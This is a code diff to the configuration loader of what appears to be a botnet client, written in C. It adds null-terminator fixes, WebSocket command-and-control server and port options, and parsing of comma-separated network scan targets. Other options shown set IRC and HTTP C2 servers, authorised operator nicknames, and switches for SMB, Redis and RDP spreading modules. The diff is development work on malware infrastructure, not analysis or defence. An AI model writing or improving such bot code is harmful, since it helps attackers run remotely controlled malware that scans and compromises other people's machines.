@@ -1274,10 +1274,12 @@ int load_config(notnet_bot_t *bot, const char *path) {
         
         if (strcmp(key, "irc_server") == 0) {
             strncpy(bot->c2_irc.server, value, 255);
+            bot->c2_irc.server[255] = '\0';
         } else if (strcmp(key, "irc_port") == 0) {
             bot->c2_irc.port = atoi(value);
         } else if (strcmp(key, "http_server") == 0) {
             strncpy(bot->c2_http.server, value, 255);
+            bot->c2_http.server[255] = '\0';
         } else if (strcmp(key, "http_port") == 0) {
             bot->c2_http.port = atoi(value);
         } else if (strcmp(key, "scan_interval") == 0) {
@@ -1294,9 +1296,11 @@ int load_config(notnet_bot_t *bot, const char *path) {
             if (atoi(value) > 0) bot->heartbeat_interval = atoi(value);
         } else if (strcmp(key, "irc_channel") == 0) {
             strncpy(bot->c2_irc.channel, value, 127);
+            bot->c2_irc.channel[127] = '\0';
             log_info("IRC channel set to %s", bot->c2_irc.channel);
         } else if (strcmp(key, "irc_pass") == 0) {
             strncpy(bot->c2_irc.pass, value, 63);
+            bot->c2_irc.pass[63] = '\0';
         } else if (strcmp(key, "irc_auth_nicks") == 0) {
             /* SECURITY FIX (#5): Comma-separated authorized C2 operator nicks.
              * Only PRIVMSGs from these nicks will be processed as commands. */
@@ -1327,22 +1331,48 @@ int load_config(notnet_bot_t *bot, const char *path) {
             }
         } else if (strcmp(key, "http_path") == 0) {
             strncpy(bot->c2_http.path, value, 127);
+            bot->c2_http.path[127] = '\0';
         } else if (strcmp(key, "http_user_agent") == 0) {
             strncpy(bot->c2_http.user_agent, value, 127);
+            bot->c2_http.user_agent[127] = '\0';
         } else if (strcmp(key, "ws_path") == 0) {
             strncpy(bot->c2_ws.path, value, 127);
+            bot->c2_ws.path[127] = '\0';
+        } else if (strcmp(key, "ws_server") == 0) {
+            strncpy(bot->c2_ws.server, value, 255);
+            bot->c2_ws.server[255] = '\0';
+        } else if (strcmp(key, "ws_port") == 0) {
+            bot->c2_ws.port = atoi(value);
         } else if (strcmp(key, "smb_enabled") == 0) {
             bot->smb_enabled = atoi(value);
         } else if (strcmp(key, "redis_enabled") == 0) {
             bot->redis_enabled = atoi(value);
         } else if (strcmp(key, "rdp_enabled") == 0) {
             bot->rdp_enabled = atoi(value);
+        } else if (strcmp(key, "scan_targets") == 0) {
+            /* README-documented format: scan_targets=192.168.1.0/24 */
+            bot->scan_target_count = 0;
+            char targets[512];
+            strncpy(targets, value, sizeof(targets) - 1);
+            targets[sizeof(targets) - 1] = '\0';
+            char *saveptr = NULL;
+            char *tok = strtok_r(targets, ",", &saveptr);
+            while (tok && bot->scan_target_count < 16) {
+                while (*tok == ' ' || *tok == '\t') tok++;
+                if (*tok) {
+                    strncpy(bot->scan_targets[bot->scan_target_count], tok, 255);
+                    bot->scan_targets[bot->scan_target_count][255] = '\0';
+                    bot->scan_target_count++;
+                }
+                tok = strtok_r(NULL, ",", &saveptr);
+            }
         } else if (strncmp(key, "scan_target_", 12) == 0) {
             /* Legacy: scan_target_0, scan_target_1, etc. */
             int idx = atoi(key + 12);
             if (idx >= 0 && idx < 16 && bot->scan_target_count <= idx) {
                 bot->scan_target_count = idx + 1;
                 strncpy(bot->scan_targets[idx], value, 255);
+                bot->scan_targets[idx][255] = '\0';
             }
         }
     }
